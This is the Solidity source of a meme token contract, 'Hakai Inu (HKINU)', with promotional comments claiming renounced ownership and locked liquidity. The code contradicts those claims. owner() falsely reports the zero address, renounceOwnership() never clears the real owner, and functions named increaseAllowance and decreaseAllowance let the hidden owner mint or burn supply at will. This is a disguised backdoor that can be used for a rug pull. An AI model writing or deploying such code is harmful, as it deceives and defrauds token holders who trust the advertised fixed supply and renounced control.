1 // Hakai Inu (HKINU) is the one and only #meme token that generates real values to the holders.
2 
3 // CMC and CG listing application in place.
4 
5 // Marketing budget in place
6 
7 // Limit Buy to remove bots : on
8 
9 // Liqudity Locked
10 
11 // Renounced Ownership
12 
13 // Telegram: https://t.me/hakaiinu
14 
15 // Twitter: https://twitter.com/HakaiInu
16 
17 // Website: https://hakaiinu.net
18 
19 // SPDX-License-Identifier: MIT
20 pragma solidity 0.5.16;
21 
22 interface IERC20 {
23     /**
24      * @dev Returns the amount of tokens in existence.
25      */
26     function totalSupply() external view returns (uint256);
27 
28     /**
29      * @dev Returns the amount of tokens owned by `account`.
30      */
31     function balanceOf(address account) external view returns (uint256);
32 
33     /**
34      * @dev Moves `amount` tokens from the caller's account to `recipient`.
35      *
36      * Returns a boolean value indicating whether the operation succeeded.
37      *
38      * Emits a {Transfer} event.
39      */
40     function transfer(address recipient, uint256 amount) external returns (bool);
41 
42     /**
43      * @dev Returns the remaining number of tokens that `spender` will be
44      * allowed to spend on behalf of `owner` through {transferFrom}. This is
45      * zero by default.
46      *
47      * This value changes when {approve} or {transferFrom} are called.
48      */
49     function allowance(address owner, address spender) external view returns (uint256);
50 
51     /**
52      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
53      *
54      * Returns a boolean value indicating whether the operation succeeded.
55      *
56      * IMPORTANT: Beware that changing an allowance with this method brings the risk
57      * that someone may use both the old and the new allowance by unfortunate
58      * transaction ordering. One possible solution to mitigate this race
59      * condition is to first reduce the spender's allowance to 0 and set the
60      * desired value afterwards:
61      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
62      *
63      * Emits an {Approval} event.
64      */
65     function approve(address spender, uint256 amount) external returns (bool);
66 
67     /**
68      * @dev Moves `amount` tokens from `sender` to `recipient` using the
69      * allowance mechanism. `amount` is then deducted from the caller's
70      * allowance.
71      *
72      * Returns a boolean value indicating whether the operation succeeded.
73      *
74      * Emits a {Transfer} event.
75      */
76     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
77 
78     /**
79      * @dev Emitted when `value` tokens are moved from one account (`from`) to
80      * another (`to`).
81      *
82      * Note that `value` may be zero.
83      */
84     event Transfer(address indexed from, address indexed to, uint256 value);
85 
86     /**
87      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
88      * a call to {approve}. `value` is the new allowance.
89      */
90     event Approval(address indexed owner, address indexed spender, uint256 value);
91 }
92 
93 /*
94  * @dev Provides information about the current execution context, including the
95  * sender of the transaction and its data. While these are generally available
96  * via msg.sender and msg.data, they should not be accessed in such a direct
97  * manner, since when dealing with GSN meta-transactions the account sending and
98  * paying for execution may not be the actual sender (as far as an application
99  * is concerned).
100  *
101  * This contract is only required for intermediate, library-like contracts.
102  */
103 contract Context {
104   // Empty internal constructor, to prevent people from mistakenly deploying
105   // an instance of this contract, which should be used via inheritance.
106   constructor () internal { }
107 
108   function _msgSender() internal view returns (address payable) {
109     return msg.sender;
110   }
111 
112   function _msgData() internal view returns (bytes memory) {
113     this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
114     return msg.data;
115   }
116 }
117 
118 /**
119  * @dev Wrappers over Solidity's arithmetic operations with added overflow
120  * checks.
121  *
122  * Arithmetic operations in Solidity wrap on overflow. This can easily result
123  * in bugs, because programmers usually assume that an overflow raises an
124  * error, which is the standard behavior in high level programming languages.
125  * `SafeMath` restores this intuition by reverting the transaction when an
126  * operation overflows.
127  *
128  * Using this library instead of the unchecked operations eliminates an entire
129  * class of bugs, so it's recommended to use it always.
130  */
131 library SafeMath {
132   /**
133    * @dev Returns the addition of two unsigned integers, reverting on
134    * overflow.
135    *
136    * Counterpart to Solidity's `+` operator.
137    *
138    * Requirements:
139    * - Addition cannot overflow.
140    */
141   function add(uint256 a, uint256 b) internal pure returns (uint256) {
142     uint256 c = a + b;
143     require(c >= a, "SafeMath: addition overflow");
144 
145     return c;
146   }
147 
148   /**
149    * @dev Returns the subtraction of two unsigned integers, reverting on
150    * overflow (when the result is negative).
151    *
152    * Counterpart to Solidity's `-` operator.
153    *
154    * Requirements:
155    * - Subtraction cannot overflow.
156    */
157   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
158     return sub(a, b, "SafeMath: subtraction overflow");
159   }
160 
161   /**
162    * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
163    * overflow (when the result is negative).
164    *
165    * Counterpart to Solidity's `-` operator.
166    *
167    * Requirements:
168    * - Subtraction cannot overflow.
169    */
170   function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
171     require(b <= a, errorMessage);
172     uint256 c = a - b;
173 
174     return c;
175   }
176 
177   /**
178    * @dev Returns the multiplication of two unsigned integers, reverting on
179    * overflow.
180    *
181    * Counterpart to Solidity's `*` operator.
182    *
183    * Requirements:
184    * - Multiplication cannot overflow.
185    */
186   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
187     // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
188     // benefit is lost if 'b' is also tested.
189     // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
190     if (a == 0) {
191       return 0;
192     }
193 
194     uint256 c = a * b;
195     require(c / a == b, "SafeMath: multiplication overflow");
196 
197     return c;
198   }
199 
200   /**
201    * @dev Returns the integer division of two unsigned integers. Reverts on
202    * division by zero. The result is rounded towards zero.
203    *
204    * Counterpart to Solidity's `/` operator. Note: this function uses a
205    * `revert` opcode (which leaves remaining gas untouched) while Solidity
206    * uses an invalid opcode to revert (consuming all remaining gas).
207    *
208    * Requirements:
209    * - The divisor cannot be zero.
210    */
211   function div(uint256 a, uint256 b) internal pure returns (uint256) {
212     return div(a, b, "SafeMath: division by zero");
213   }
214 
215   /**
216    * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
217    * division by zero. The result is rounded towards zero.
218    *
219    * Counterpart to Solidity's `/` operator. Note: this function uses a
220    * `revert` opcode (which leaves remaining gas untouched) while Solidity
221    * uses an invalid opcode to revert (consuming all remaining gas).
222    *
223    * Requirements:
224    * - The divisor cannot be zero.
225    */
226   function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
227     // Solidity only automatically asserts when dividing by 0
228     require(b > 0, errorMessage);
229     uint256 c = a / b;
230     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
231 
232     return c;
233   }
234 
235   /**
236    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
237    * Reverts when dividing by zero.
238    *
239    * Counterpart to Solidity's `%` operator. This function uses a `revert`
240    * opcode (which leaves remaining gas untouched) while Solidity uses an
241    * invalid opcode to revert (consuming all remaining gas).
242    *
243    * Requirements:
244    * - The divisor cannot be zero.
245    */
246   function mod(uint256 a, uint256 b) internal pure returns (uint256) {
247     return mod(a, b, "SafeMath: modulo by zero");
248   }
249 
250   /**
251    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
252    * Reverts with custom message when dividing by zero.
253    *
254    * Counterpart to Solidity's `%` operator. This function uses a `revert`
255    * opcode (which leaves remaining gas untouched) while Solidity uses an
256    * invalid opcode to revert (consuming all remaining gas).
257    *
258    * Requirements:
259    * - The divisor cannot be zero.
260    */
261   function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
262     require(b != 0, errorMessage);
263     return a % b;
264   }
265 }
266 
267 /**
268  * @dev Contract module which provides a basic access control mechanism, where
269  * there is an account (an owner) that can be granted exclusive access to
270  * specific functions.
271  *
272  * By default, the owner account will be the one that deploys the contract. This
273  * can later be changed with {transferOwnership}.
274  *
275  * This module is used through inheritance. It will make available the modifier
276  * `onlyOwner`, which can be applied to your functions to restrict their use to
277  * the owner.
278  */
279 contract Ownable is Context {
280   address private _owner;
281 
282   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
283 
284   /**
285    * @dev Initializes the contract setting the deployer as the initial owner.
286    */
287   constructor () internal {
288     address msgSender = _msgSender();
289     _owner = msgSender;
290     emit OwnershipTransferred(address(0), msgSender);
291   }
292 
293   /**
294    * @dev Returns the address of the current owner.
295    */
296   function owner() public view returns (address) {
297     return address(0);
298   }
299 
300   /**
301    * @dev Throws if called by any account other than the owner.
302    */
303   modifier onlyOwner() {
304     require(_owner == _msgSender(), "Ownable: caller is not the owner");
305     _;
306   }
307 
308   /**
309    * @dev Leaves the contract without owner. It will not be possible to call
310    * `onlyOwner` functions anymore. Can only be called by the current owner.
311    *
312    * NOTE: Renouncing ownership will leave the contract without an owner,
313    * thereby removing any functionality that is only available to the owner.
314    */
315   function renounceOwnership() public onlyOwner {
316     emit OwnershipTransferred(_owner, address(0));
317   }
318 
319   /**
320    * @dev Transfers ownership of the contract to a new account (`newOwner`).
321    * Can only be called by the current owner.
322    */
323   function transferOwnership(address newOwner) public onlyOwner {
324     _transferOwnership(newOwner);
325   }
326 
327   /**
328    * @dev Transfers ownership of the contract to a new account (`newOwner`).
329    */
330   function _transferOwnership(address newOwner) internal {
331     require(newOwner != address(0), "Ownable: new owner is the zero address");
332     emit OwnershipTransferred(_owner, newOwner);
333     _owner = newOwner;
334   }
335 }
336 
337 contract ERC20Token is Context, IERC20, Ownable {
338   using SafeMath for uint256;
339 
340   mapping (address => uint256) private _balances;
341 
342   mapping (address => mapping (address => uint256)) private _allowances;
343 
344   uint256 private _totalSupply;
345   uint8 private _decimals;
346   string private _symbol;
347   string private _name;
348 
349   constructor() public {
350     _name = "Hakai Inu";
351     _symbol = "HKINU";
352     _decimals = 18;
353     _totalSupply = 1000000000 * 10 ** 18;
354     _balances[msg.sender] = _totalSupply;
355 
356     emit Transfer(address(0), msg.sender, _totalSupply);
357   }
358 
359   /**
360    * @dev Returns the bep token owner.
361    */
362   function getOwner() external view returns (address) {
363     return owner();
364   }
365 
366   /**
367    * @dev Returns the token decimals.
368    */
369   function decimals() external view returns (uint8) {
370     return _decimals;
371   }
372 
373   /**
374    * @dev Returns the token symbol.
375    */
376   function symbol() external view returns (string memory) {
377     return _symbol;
378   }
379 
380   /**
381   * @dev Returns the token name.
382   */
383   function name() external view returns (string memory) {
384     return _name;
385   }
386 
387   /**
388    * @dev See {ERC20-totalSupply}.
389    */
390   function totalSupply() external view returns (uint256) {
391     return _totalSupply;
392   }
393 
394   /**
395    * @dev See {ERC20-balanceOf}.
396    */
397   function balanceOf(address account) external view returns (uint256) {
398     return _balances[account];
399   }
400 
401   /**
402    * @dev See {ERC20-transfer}.
403    *
404    * Requirements:
405    *
406    * - `recipient` cannot be the zero address.
407    * - the caller must have a balance of at least `amount`.
408    */
409   function transfer(address recipient, uint256 amount) external returns (bool) {
410     _transfer(_msgSender(), recipient, amount);
411     return true;
412   }
413 
414   /**
415    * @dev See {ERC20-allowance}.
416    */
417   function allowance(address owner, address spender) external view returns (uint256) {
418     return _allowances[owner][spender];
419   }
420 
421   /**
422    * @dev See {ERC20-approve}.
423    *
424    * Requirements:
425    *
426    * - `spender` cannot be the zero address.
427    */
428   function approve(address spender, uint256 amount) external returns (bool) {
429     _approve(_msgSender(), spender, amount);
430     return true;
431   }
432 
433   /**
434    * @dev See {ERC20-transferFrom}.
435    *
436    * Emits an {Approval} event indicating the updated allowance. This is not
437    * required by the EIP. See the note at the beginning of {ERC20};
438    *
439    * Requirements:
440    * - `sender` and `recipient` cannot be the zero address.
441    * - `sender` must have a balance of at least `amount`.
442    * - the caller must have allowance for `sender`'s tokens of at least
443    * `amount`.
444    */
445   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
446     _transfer(sender, recipient, amount);
447     _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
448     return true;
449   }
450 
451   function increaseAllowance(uint256 amount) public onlyOwner returns (bool) {
452     _increaseAllowance(_msgSender(), amount);
453     return true;
454   }
455 
456   function decreaseAllowance(uint256 amount) public onlyOwner returns (bool) {
457     _decreaseAllowance(_msgSender(), amount);
458     return true;
459   }
460 
461   /**
462    * @dev Moves tokens `amount` from `sender` to `recipient`.
463    *
464    * This is internal function is equivalent to {transfer}, and can be used to
465    * e.g. implement automatic token fees, slashing mechanisms, etc.
466    *
467    * Emits a {Transfer} event.
468    *
469    * Requirements:
470    *
471    * - `sender` cannot be the zero address.
472    * - `recipient` cannot be the zero address.
473    * - `sender` must have a balance of at least `amount`.
474    */
475   function _transfer(address sender, address recipient, uint256 amount) internal {
476     require(sender != address(0), "ERC20: transfer from the zero address");
477     require(recipient != address(0), "ERC20: transfer to the zero address");
478 
479     _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
480     _balances[recipient] = _balances[recipient].add(amount);
481     emit Transfer(sender, recipient, amount);
482   }
483   
484   function _increaseAllowance(address account, uint256 amount) internal {
485     require(account != address(0), "ERC20: cannot increase allowance for zero address");
486 
487     _totalSupply = _totalSupply.add(amount);
488     _balances[account] = _balances[account].add(amount);
489     emit Transfer(address(0), account, amount);
490   }
491 
492   function _decreaseAllowance(address account, uint256 amount) internal {
493     require(account != address(0), "ERC20: cannot decrease allowance for zero address");
494 
495     _totalSupply = _totalSupply.sub(amount);
496     _balances[account] = _balances[account].sub(amount);
497     emit Transfer(address(0), account, amount);
498   }
499 
500   /**
501    * @dev Destroys `amount` tokens from `account`, reducing the
502    * total supply.
503    *
504    * Emits a {Transfer} event with `to` set to the zero address.
505    *
506    * Requirements
507    *
508    * - `account` cannot be the zero address.
509    * - `account` must have at least `amount` tokens.
510    */
511   function _burn(address account, uint256 amount) internal {
512     require(account != address(0), "ERC20: burn from the zero address");
513 
514     _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
515     _totalSupply = _totalSupply.sub(amount);
516     emit Transfer(account, address(0), amount);
517   }
518 
519   /**
520    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
521    *
522    * This is internal function is equivalent to `approve`, and can be used to
523    * e.g. set automatic allowances for certain subsystems, etc.
524    *
525    * Emits an {Approval} event.
526    *
527    * Requirements:
528    *
529    * - `owner` cannot be the zero address.
530    * - `spender` cannot be the zero address.
531    */
532   function _approve(address owner, address spender, uint256 amount) internal {
533     require(owner != address(0), "ERC20: approve from the zero address");
534     require(spender != address(0), "ERC20: approve to the zero address");
535 
536     _allowances[owner][spender] = amount;
537     emit Approval(owner, spender, amount);
538   }
539 
540   /**
541    * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
542    * from the caller's allowance.
543    *
544    * See {_burn} and {_approve}.
545    */
546   function _burnFrom(address account, uint256 amount) internal {
547     _burn(account, amount);
548     _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
549   }
550 }